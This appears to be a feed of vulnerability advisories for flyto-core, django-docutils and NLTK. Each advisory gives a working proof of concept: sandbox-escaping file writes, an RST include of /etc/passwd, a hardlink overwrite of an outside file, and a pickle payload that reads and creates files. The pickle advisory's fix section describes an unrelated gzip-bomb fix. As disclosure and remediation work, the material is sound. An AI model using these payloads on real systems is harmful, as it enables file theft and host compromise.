The remediation for GHSA-2956 confined writes by adding a per-module validate_path_with_env_config() call to an explicit list of modules, rather than enforcing confinement centrally. Any file-writing module absent from that list — the entire data.* and file.* families here — remains an arbitrary-write primitive. data.csv.write's '..'-substring check is a denylist that misses absolute paths.

Impact

Arbitrary file write with attacker-controlled content and path, escaping FLYTO_SANDBOX_DIR. Overwriting a Python module under the install dir, a .flyto recipe, a shell rc, a crontab, or ~/.ssh/authorized_keys yields code execution / full host compromise — the same impact GHSA-2956 was rated Critical for.

Executable PoC (benign sentinel, local only)

FLYTO_SANDBOX_DIR is set to the intended confinement; the module writes outside it while the GHSA-2956 guard rejects the same path.

import os, sys, asyncio
SBX = os.environ.setdefault('FLYTO_SANDBOX_DIR', "/tmp/flyto_sbx"); os.makedirs(SBX, exist_ok=True)
sys.path.insert(0, "<flyto-core>/src")
OUT = "/tmp/flyto_PWNED_OUTSIDE.csv"           # absolute, outside the sandbox, no ".."
from core.utils import validate_path_with_env_config, PathTraversalError
try:
    validate_path_with_env_config(OUT); print("[guard] UNEXPECTED allow")
except PathTraversalError:
    print("[guard] GHSA-2956 guard REJECTS out-of-sandbox path (as intended)")
async def call(W, p): return await W(p, {}).execute()
from core.modules.atomic.data.csv_write import csv_write
from core.modules.atomic.data.json_to_csv import json_to_csv
asyncio.run(call(csv_write,  {'file_path': OUT, 'data':[{'pwn':'SENTINEL_CSV'}]}))
asyncio.run(call(json_to_csv,{'input_data':[{'pwn':'SENTINEL_JSON'}], 'output_path': OUT+'.json.csv'}))
print("wrote outside sandbox:", os.path.exists(OUT),
      "| inside sandbox?", os.path.realpath(OUT).startswith(os.path.realpath(SBX)))

Observed output:

[guard] GHSA-2956 guard validate_path_with_env_config() REJECTS out-of-sandbox path
[data.csv.write]   wrote=True inside_sandbox=False
[data.json_to_csv] wrote=True inside_sandbox=False
BUG CONFIRMED (arbitrary write outside sandbox)
  sample content: pwn / SENTINEL_CSV

Adversarial re-read (what I tried to refute it with)

  • Central path guard? No — runtime/languages.py PathTraversalError only guards plugin entry-point loading; the GHSA-2956 fix is per-module (confirmed at image/download.py:21). A module without the call is unconfined.
  • '..' check in csv_write? Denylist; absolute paths contain no .. → bypassed (PoC uses /tmp/...). json_to_csv/file.copy/file.move have no check at all.
  • required_permissions=['filesystem.write']? A capability flag, not a path confinement — the GHSA-2956-guarded modules declare it too and still needed the guard.
  • Sandbox default? FLYTO_SANDBOX_DIR defaults to cwd (warning only); the PoC sets it explicitly to show the confinement is bypassed even when configured.
  • Result: no concrete blocker. CONFIRMED (incomplete fix).

Remediation

Enforce confinement centrally: route every filesystem write through validate_path_with_env_config() at the engine/module-base layer (e.g. in the write path of BaseModule, or a filesystem.write-capability hook), instead of per-module opt-in. As an immediate patch, add the call to data.csv.write, data.json_to_csv, file.copy, file.move, and audit every module with filesystem.write in required_permissions. Replace the '..' substring denylist with the canonical realpath+startswith(base) check already in validate_path_safe.

Confidence

High — executed PoC (benign sentinel) shows two modules writing attacker-controlled content to an absolute path outside FLYTO_SANDBOX_DIR, while the GHSA-2956 guard rejects the same path.

Proof-of-Concept source (poc_arbitrary_write.py)

"""PoC: arbitrary file write via unguarded sibling write modules (incomplete fix of GHSA-2956).
Run: FLYTO_SANDBOX_DIR is set to the intended confinement; the modules write OUTSIDE it."""
import os, sys, asyncio
SBX = os.environ.setdefault('FLYTO_SANDBOX_DIR', "/tmp/home-aoc-CVEs/a257f729-6be4-42cc-a7ec-4342ae8294bf/scratchpad/flyto_sbx")
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "..", "flyto-core", "src"))
sys.path.insert(0, "/home/aoc/CVEs/flyto-core/src")
OUT="/tmp/-home-aoc-CVEs/a257f729-6be4-42cc-a7ec-4342ae8294bf/scratchpad/flyto_PWNED_OUTSIDE.csv"; OUT2="/tmp/-home-aoc-CVEs/a257f729-6be4-42cc-a7ec-4342ae8294bf/scratchpad/flyto_PWNED_json.csv"
from core.utils import validate_path_with_env_config, PathTraversalError
try:
    validate_path_with_env_config(OUT); print("[guard] UNEXPECTED allow")
except PathTraversalError:
    print("[guard] GHSA-2956 guard validate_path_with_env_config() REJECTS out-of-sandbox path")
async def call(W, p): return await W(p, {}).execute()
from core.modules.atomic.data.csv_write import csv_write
from core.modules.atomic.data.json_to_csv import json_to_csv
r1 = asyncio.run(call(csv_write, {'file_path': OUT, 'data':[{'pwn':'SENTINEL_CSV'}]}))
r2 = asyncio.run(call(json_to_csv, {'input_data':[{'pwn':'SENTINEL_JSON'}], 'output_path': OUT2}))
for tag,out in [('data.csv.write',OUT),('data.json_to_csv',OUT2)]:
    inside = os.path.realpath(out).startswith(os.path.realpath(SBX))
    print(f"[{tag}] wrote={os.path.exists(out)} inside_sandbox={inside} -> {out}")
ok = os.path.exists(OUT) and not os.path.realpath(OUT).startswith(os.path.realpath(SBX))
print("BUG CONFIRMED (arbitrary write outside sandbox)" if ok else "NOT CONFIRMED")
print("  sample content:", open(OUT).read().strip())

References

items.content_html:
Summary

django-docutils before 0.30.0 rendered reStructuredText through Docutils without protected web-safe defaults. Public rendering paths, including publish_doctree, publish_html_from_source, publish_html_from_doctree, publish_parts_from_doctree, the {% rst %} template tag, the rst template filter, DocutilsTemplates, and DocutilsView, could process attacker-controlled RST with Docutils directives that read local files, fetch URL-backed content, or emit raw HTML.

The issue is fixed in 0.30.0 by disabling Docutils file insertion, raw directives, local docutils.conf processing, and unsafe URI schemes by default, and by sanitizing doctrees before HTML is emitted.

Applications are affected when they render attacker-controlled or lower-trust RST through django-docutils without their own safe Docutils configuration. Applications that only render trusted static RST are not affected unless that content can be influenced by an attacker.

Impact

An attacker who can influence RST rendered by a vulnerable django-docutils integration may be able to read files readable by the Django worker process, trigger server-side requests through URL-backed directives, or inject raw HTML/JavaScript into rendered output.

Examples of affected application patterns include comments, wiki pages, blog bodies, profile or biography fields, CMS fields, uploaded RST documents, API-supplied RST, or overridden view content methods that return user-supplied RST.

Potential impact includes disclosure of application configuration, environment files, credentials, source files, templates, mounted secrets, and logs readable by the process. UI escaping after rendering is not sufficient for file disclosure because the server-side read occurs before HTML reaches the client.

Affected versions

Affected package: django-docutils on PyPI

Affected versions: <= 0.29.0

Patched versions: >= 0.30.0

Technical details

Before 0.30.0, django-docutils handed RST content to Docutils without forcing these web-safe settings:

{
    "file_insertion_enabled": False,
    "raw_enabled": False,
    "_disable_config": True,
}

Docutils treats file insertion and raw content as legitimate features for trusted documents. In a web application that renders lower-trust RST, those defaults can expose server-side data or emit attacker-controlled HTML unless the application disables the features.

The vulnerable behavior included:

  • .. include:: <file> reading local files
  • .. include:: <url> fetching URL-backed content server-side
  • .. csv-table:: :file: reading local files
  • .. csv-table:: :url: fetching URL-backed content server-side
  • .. raw:: html emitting unescaped HTML
  • .. raw:: html :file: reading and emitting file-backed raw content
  • local docutils.conf configuration re-enabling unsafe behavior

Proof of concept

This minimal harness uses the public {% rst %} template tag. On vulnerable versions, the include directive expands server-side and the raw directive emits unescaped HTML. On fixed versions, both directives are disabled under the default configuration.

import django
from django.conf import settings

settings.configure(
    INSTALLED_APPS=["django_docutils"],
    TEMPLATES=[{
        "BACKEND": "django.template.backends.django.DjangoTemplates",
        "DIRS": [], "APP_DIRS": False,
        "OPTIONS": {"libraries": {"dj": "django_docutils.templatetags.django_docutils"}},
    }],
    # DJANGO_DOCUTILS_LIB_RST intentionally unset == default install.
)
django.setup()

from django.template import engines

dj = engines["django"]

def render_user_rst(rst: str) -> str:
    return dj.from_string("{% load dj %}{% rst content %}").render({"content": rst})

print(render_user_rst(".. include:: /etc/passwd\n"))
print(render_user_rst(".. raw:: html\n\n   <b>x</b>\n"))

Expected behavior on vulnerable releases such as 0.28.0 and 0.29.0:

The include directive emits readable file contents.
The raw directive emits <b>x</b> as HTML.

Expected behavior on fixed releases such as 0.30.0 and later:

The include directive is disabled.
The raw directive is disabled.

Remediation

Upgrade to django-docutils 0.30.0 or later.

For trusted static RST that intentionally depends on unsafe Docutils features, opt in explicitly:

DJANGO_DOCUTILS_LIB_RST = {
    "allow_unsafe_docutils_settings": True,
    "docutils": {
        "raw_enabled": True,
        "file_insertion_enabled": True,
        "_disable_config": False,
    },
}

Do not enable unsafe Docutils settings for comments, profile text, CMS fields, uploaded files, API request data, or other lower-trust content.

Note: django-docutils==0.30.0 has an undeclared runtime dependency on typing-extensions; install it alongside if your environment doesn't already provide it (tracked separately as a packaging fix).

items.content_html:
Summary

NLTK ships a security wrapper, nltk.pathsec.ZipFile, that is meant to confine archive extraction to trusted data roots and to block link-based escapes. When nltk.download() installs a package, the extraction write opens each member's target path without checking whether that path is a hardlink to a file located outside the data root. A local actor who can write inside a shared or predictable NLTK data root (for example ~/nltk_data, a group-writable /usr/share/nltk_data, or a shared container volume) can pre-plant an in-root hardlink at a member path that a soon-to-be-installed package will write. When the victim later runs the download, extraction truncates and overwrites the outside-root target through that hardlink. This is the same weakness class as the previously fixed downloader hardlink issue, but the fix did not reach the package-extraction write sink, so the latest published release remains exploitable through this path.

Root Cause

The prior fix added an st_nlink > 1 refusal to the file-open helpers (nltk.pathsec.open / _hardened_open) and routed the downloader temporary-file write through that hardened opener, so a multiply-linked inode is refused on those paths. The extraction write sink was never given the same check. On published releases, nltk.pathsec.ZipFile.extract validates member names with validate_zip_archive and then delegates to the standard library extractor, whose plain open(targetpath, "wb") opens and truncates a pre-existing hardlink. The containment guard validate_zip_archive relies on Path.resolve() and name checks; resolve() follows symlinks (so a symlinked member is correctly refused) but a hardlink has a legitimate in-root name and in-root resolved path, so it passes. No code on the extraction path performs the st_nlink fstat that the sibling open helper performs.

Affected component: nltk.pathsec (archive extraction), driven by nltk.downloader
Released sink (<= 3.10.3): nltk/pathsec.py ZipFile.extract -> stdlib zipfile._extract_member -> open(targetpath, "wb")
Containment guard that fails open for hardlinks: nltk/pathsec.py validate_zip_archive (name checks + Path.resolve())
Development-branch sink: nltk/pathsec.py ZipFile._extract_member leaf reopen with O_WRONLY|O_TRUNC|O_NOFOLLOW (no st_nlink fstat)

Impact

An unprivileged local user who can create a file inside a data root that the victim's NLTK installation will extract into can cause the victim's process to truncate and overwrite a file outside that root. The attacker chooses which outside file is destroyed by selecting the hardlink target, so the integrity impact is complete for the chosen path (arbitrary outside-root file destruction). Where the victim resolves packages through an attacker-influenced mirror or index, the overwritten bytes are also attacker-chosen, which plausibly enables targeted file replacement and later code execution if the victim subsequently consumes the replaced file; that escalation is plausible rather than demonstrated here. Practical exploitation requires either that kernel hardlink protection (fs.protected_hardlinks) is disabled, or that the outside target is one the planting actor is permitted to hardlink (owned, writable, or group-shared), which is the same precondition carried by the previously accepted advisory for this weakness class.

Proof of Concept

Dependencies: a released nltk (3.10.3) installed from PyPI. The demonstration creates a data root, a victim file outside it, and a package archive whose member path is pre-planted as a hardlink to the victim file, then extracts through the security wrapper. It runs as a single user and succeeds even with fs.protected_hardlinks=1.

Steps:

  1. Register a data root with nltk.data.path and create an extraction subtree inside it.
  2. Create a victim file outside the data root.
  3. Pre-plant an in-root hardlink at the member path the archive will write.
  4. Extract the archive through nltk.pathsec.ZipFile.extract.
import os, sys, tempfile, zipfile
import nltk
import nltk.pathsec as ps

work = tempfile.mkdtemp()
data_root = os.path.join(work, "nltk_data")
extract_root = os.path.join(data_root, "corpora")
os.makedirs(os.path.join(extract_root, "pkgid"))
nltk.data.path.insert(0, data_root)

outside = os.path.join(work, "victim.txt")
open(outside, "w").write("ORIGINAL-VICTIM-CONTENT")

zippath = os.path.join(data_root, "pkg.zip")
with zipfile.ZipFile(zippath, "w") as z:
    z.writestr("pkgid/target", "PWNED-BY-EXTRACTION")

member_abs = os.path.join(extract_root, "pkgid/target")
os.link(outside, member_abs)  # pre-planted in-root hardlink

with ps.ZipFile(zippath, "r") as z:
    z.extract("pkgid/target", path=extract_root)

print("victim now:", open(outside).read())

victim now: PWNED-BY-EXTRACTION

The equivalent test using a symlink instead of a hardlink is refused by validate_zip_archive with a Security Violation, isolating the missing guard to hardlinks on the extraction write.

Attack Chain

  1. Exposure: nltk.download() (and python -m nltk.downloader) is the shipped, default entry point; extraction of .zip packages into a data root is default behavior and is reachable by a local actor who can write inside a shared or predictable data root.
  2. Control: the attacker controls the target inode by pre-planting an in-root hardlink at <download_dir>/<subdir>/<pkg_id>/<member>, and (under an attacker-influenced mirror) the written bytes; the member name stays <pkg_id>/... so it satisfies every name guard.
  3. Path: the install path does not wipe the destination before extraction (the tree is only removed on a STALE status, and that cleanup unlinks names rather than truncating the victim inode), so the planted hardlink survives to the write. The value flows through the downloader expected_root check and _validate_member (which uses realpath, so a hardlink stays in-root), then through validate_zip_archive (which uses resolve()), to the extraction write.
  4. Guard: every guard on the path inspects names or resolved paths; none performs the st_nlink > 1 fstat. resolve(), realpath(), and O_NOFOLLOW all fail to detect a hardlink because a hardlink is an ordinary regular file with a legitimate in-root name.
  5. Primitive: the member write opens the pre-existing hardlink and truncates plus overwrites the outside-root inode.
  6. Result: the victim-owned file chosen by the planting actor is destroyed and replaced with the extracted member's bytes, crossing from the managed data root out to the general filesystem.

Bypass Evidence

The prior remediation for this weakness is the canonical reference here: it added st_nlink > 1 refusals to nltk.pathsec.open / _hardened_open and routed the downloader temporary-file write through that opener. The new evidence is that the extraction write sink was never covered by that fix. On the released 3.10.3 wheel obtained from PyPI, the only st_nlink occurrences are inside the open helper; ZipFile.extract validates names and then calls the standard library extractor with no st_nlink check. Attempts to disprove the finding were made and failed:

  • Hypothesis that the released 3.10.3 routes extraction through a hardened or st_nlink path: refuted by inspecting the released wheel (ZipFile.extract delegates to the standard library, no override, no st_nlink on the extraction path) and by dynamic reproduction (hardlink overwrote the outside file; symlink refused).
  • Hypothesis that validate_zip_archive or _validate_member catch the hardlink: refuted because both use resolve() / realpath(), which cannot reveal a hardlink; the symlink-refused versus hardlink-overwritten asymmetry was reproduced.
  • Hypothesis that the download flow wipes the destination before extraction: refuted because the wipe runs only on a STALE status and uses name unlink, which does not truncate the victim inode.
  • Hypothesis that O_NOFOLLOW / O_EXCL on the development branch block it: refuted because O_NOFOLLOW guards only against a symlink final component and O_EXCL merely diverts to the truncate reopen branch; neither performs the st_nlink fstat.
  • Hypothesis that kernel hardlink protection makes it a non-issue: retained as a severity bound, not a disqualifier, because the same precondition applies to the previously accepted advisory for this weakness class.

Affected Versions

  • Ecosystem: pip
  • Package: nltk
  • Confirmed affected range: >= 3.9.4, <= 3.10.3
  • Latest release checked: 3.10.3 (PyPI, nltk-3.10.3-py3-none-any.whl)
  • Fix status: not fixed (latest published release is affected; no fixed version exists)

The latest published release (3.10.3) carries the open-helper fix for the related downloader issue yet remains exploitable through the extraction sink, so the upper bound is the current release and no fixed version exists. Releases 3.9.4 through 3.10.2 have no st_nlink guard at all and follow the hardlink through the same extraction path (confirmed by wheel inspection); the range floor 3.9.4 is the earliest release carrying this nltk.pathsec extraction path. The development branch adds a hardened extraction override that still omits the st_nlink check, so the same vector persists there through a different sink symbol; a fixed release should not be inferred from that development-branch change.

Suggested Fix

Enforce the invariant that an extraction write must never land on a multiply-linked inode. Extend the existing st_nlink > 1 refusal (as implemented in the hardened open helper) to the extraction write descriptor: after opening or creating the leaf target, fstat the descriptor and refuse an inode with st_nlink > 1 before truncating or writing. Apply this on both the released delegation path and the development-branch _extract_member override, or alternatively have validate_zip_archive / the downloader member validator fstat each existing target and refuse a multiply-linked inode. As an interim mitigation, operators should ensure fs.protected_hardlinks=1 is enabled and avoid shared, group-writable, or predictable data roots for accounts that run untrusted downloads.

Reported by zx (GitHub: @manus-pi).

Fix status (2026-09-28)

Status: IN PROGRESS (fix on an open pull request, not yet on develop).

PR: #3753 "[Do not merge yet] Fix GHSA-8mgp-746c-j5xp: URL-scheme bypass of pathsec.validate_path", open; head da55cab0e at the time of this note (a develop merge on top of 238f81500, the head on which the verdicts below were measured).

Fix commit: cf12a5e6a (pathsec.ZipFile._extract_member resolves member names to ZipInfo so the hardened extraction path actually runs, refuses a target with st_nlink greater than 1, and replaces through unlink plus O_EXCL; the downloader adds an lstat pre-check).

Probe: nltk/test/unit/security_probes/ghsa_wr3g_j6qj_xpgh.py (on the PR). Verdict on the PR head: FIXED (hardlinked member target refused with PermissionError). The same probe run against develop 2fa3f48fe: VULNERABLE (extraction wrote through the hardlink to the outside secret).

Release: none.

References

  • https://github.com/nltk/nltk/security/advisories/GHSA-wr3g-j6qj-xpgh
  • https://nvd.nist.gov/vuln/detail/CVE-2026-128135

  • https://github.com/nltk/nltk/commit/0e9898b7615b4ab3b023e868212316a489ece4f0

items.content_html:
Summary

nltk.picklesec.allowlisted_pickle_load keyed its denylist of dangerous globals by export name, so numpy's file-I/O callables that live in submodules and are not re-exported under __module__ == "numpy" were never matched. Under the broad allowed_modules=("numpy", "scipy", "sklearn") allowance that TransitionParser.parse(depgraphs, modelFile) granted for model files, a crafted protocol 4 pickle could name numpy.lib._npyio_impl.recfromtxt (arbitrary file read, result returned to the caller of allowlisted_pickle_load) or numpy.lib.format.open_memmap (attacker-chosen file create), and the REDUCE opcode invoked them during the load.

Affected

nltk >= 3.10.0 and <= 3.10.3 (the allowlisting unpickler and the TransitionParser model path); numpy must be installed.

Reproduction

A pickle whose REDUCE names numpy.lib._npyio_impl.recfromtxt with a target path, loaded through allowlisted_pickle_load(data, allowed_modules=("numpy",)), reads that file on v3.10.3; one naming numpy.lib.format.open_memmap with mode w+ creates a file. Both are refused on develop with UnpicklingError: global '...' is from a denied module. The maintainer transcript below shows the before and after runs.

Impact

File read and file create on the host that loads an untrusted model through NLTK's allowlisting unpickler. No code execution: this sits below the TransitionParser code-execution sibling GHSA-m396-3h67-vpfv, which is why the severity was reassessed to Medium (see the reply below).

Editorial note (2026-10-10): the report body of this advisory had been overwritten with the text of GHSA-rv69-j573-cm47 (the nested gzip decompression bomb). The summary above was reconstructed by the maintainers from the title, the maintainer reply, the CVSS justification and PR #3757; the original reporter text is not recoverable from the record.

Fix status (2026-09-28)

Status: MERGED on develop (unreleased; v3.10.3 of 2026-08-12 predates the fix).

PR: #3778 "Bound decompression entry points in nltk (zip/gzip layers + pathsec.ZipFile + weka), CWE-409", merged 2026-08-25, merge commit 42d99b7a2 on develop. Fix commits: b6e0cedca (the nested gzip layer of a zip .gz member is bounded) and c6fe98211 (the decompression guards stream instead of buffering whole payloads).

Probe: none. The advisory PoC re-run on develop 2fa3f48fe (256 MiB of zeros gzipped into a STORED zip member declared at about 256 KiB, read through nltk.data.find().open().read()): refused with ValueError "Refusing to decompress suspected gzip bomb 'corpus/bomb.gz': it expands beyond nltk.data.MAX_UNZIP_RATIO=1000".

Release: none yet; no release tag contains b6e0cedca.

Maintainer reply (2026-09-28)

Status: fixed on develop, unreleased.

Fix verified

The numpy submodule file I/O sinks named in this report are denied on develop. This is fixed by PR #3757 ("Harden untrusted-model pickle allowlist (exact globals + numpy.lib denylist)"), merged into develop on 2026-08-20 as merge commit 628ebd2fa1b81d961edb6eff6b2eddd9d64588ba. The fix commit is a44a7af69bca87e92d9c4a701fcbbe4512e8d450 and the regression tests are in fb8da992b7b2ad082c69d2618ae2ac1c90c6b8b8.

What the fix does. In nltk/picklesec.py the denylist no longer keys numpy sinks by export name; it now denies whole module prefixes. _DENIED_MODULE_PREFIXES gained numpy.lib, numpy.rec, numpy.core.records, numpy._core.records, numpy.ma.mrecords and numpy.compat, so numpy.lib.npyio, numpy.lib._npyio_impl and numpy.lib.format resolve inside a denied prefix and are refused under both request forms (the submodule module string and any top level re-export). In nltk/parse/transitionparser.py the model load no longer grants a broad allowed_modules=("numpy","scipy","sklearn"); it now uses allowed_modules=() plus an exact _MODEL_ALLOWED_GLOBALS list, and the model read is routed through pathsec.open.

Before and after evidence

Reproduced the report's own primitives with a protocol 4 REDUCE payload for numpy.lib._npyio_impl.recfromtxt (arbitrary file read) and numpy.lib.format.open_memmap (arbitrary file create), loaded through allowlisted_pickle_load(allowed_modules=("numpy","scipy","sklearn")), and also driven through the real TransitionParser.parse product path. Judged by whether the sink actually touched a file, not by whether something raised. Interpreter: env -u PYTHONPATH /usr/local/bin/python3.13, CPython 3.13.7, numpy 2.4.4, scipy 1.18.1, sklearn 1.9.0.

Before the fix, on release tag v3.10.3 (303f6e2ba), nltk 3.10.3:

[READ ] recfromtxt sink reached = True   returned [[1, 2, 3], [4, 5, 6]] (file was read)
[WRITE] open_memmap sink reached = True   attacker chosen path created on disk
[CTRL ] canonical numpy.load = refused: UnpicklingError (already denylisted in 3.10.3)
[PROD ] TransitionParser.parse sink reached = True   model load passed the allowlist;
        AttributeError after load: recarray has no attribute predict_proba (the read ran)
VERDICT: SINK REACHED (vulnerable)

After the fix, on develop (2fa3f48fe):

[READ ] recfromtxt sink reached = False   refused: UnpicklingError: global
        'numpy.lib._npyio_impl.recfromtxt' is from a denied module
[WRITE] open_memmap sink reached = False   refused: UnpicklingError: global
        'numpy.lib.format.open_memmap' is from a denied module; no file created
[PROD ] TransitionParser.parse sink reached = False   blocked at the allowlist: UnpicklingError
VERDICT: SINK BLOCKED (fixed)

Tests

The regression suite added by the fix passes on develop. TestNumpySubmoduleFileIOSinks in nltk/test/unit/test_pickle_allowlist_security.py: 31 passed, 1 skipped. The combined suites test_pickle_allowlist_security.py, test_pathsec_sweep_transitionparser.py and test_pathsec_sweep_deserialization.py: 251 passed, 2 skipped.

Severity reassessment

Lowered from High (8.2) to Medium.

New vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N (base 6.1, Medium).

Reasoning:

  • The reachable primitives are file read (recfromtxt, recfromcsv) and constrained file create or truncate (open_memmap in w+ mode writes a numpy .npy header). The proof of concept does not achieve code execution, so integrity is Low (I:L, no arbitrary content control) and availability is None (A:N). Confidentiality is set High (C:H) as a worst case because a direct allowlisted_pickle_load caller receives the read object; note that through TransitionParser.parse the read content is consumed internally and is not returned to the attacker.
  • The sink fires only when a victim loads attacker controlled bytes through NLTK's allowlisting unpickler, which is itself a defensive layer, and numpy must be installed. Loading an untrusted model file is a local, operator initiated action, so Attack Vector is Local (AV:L) and User Interaction is Required (UI:R). No privileges are needed to craft the payload (PR:N) and no privilege boundary is crossed (S:U).
  • Calibration against siblings in this repository: GHSA-m396-3h67-vpfv scores the same TransitionParser model load path at 7.8 High (AV:L/UI:R, C:H/I:H/A:H) because it reaches remote code execution. A file read and file create only issue on the same path must sit below full code execution, not above it. The previous 8.2 exceeded that code execution sibling and came from AV:N/UI:N, which overstated the delivery of a file as network attack surface. The file I/O and DoS sibling GHSA-7pvm-89gg-6c6h sits at 6.2 Medium, consistent with this Medium rating.

Release status

No release tag contains commit a44a7af69 (checked with git tag, contains option), so the fix is on develop and is not in any release yet. The latest release v3.10.3 (2026-08-12) predates the fix commit (2026-08-17).

References

  • https://github.com/nltk/nltk/security/advisories/GHSA-c59x-vh6j-3w8v
  • https://nvd.nist.gov/vuln/detail/CVE-2026-128136
  • https://github.com/nltk/nltk/pull/3757
  • https://github.com/nltk/nltk/commit/a44a7af69bca87e92d9c4a701fcbbe4512e8d450
  • https://github.com/nltk/nltk/releases/tag/v3.10.4
  • https://github.com/advisories/GHSA-c59x-vh6j-3w8v
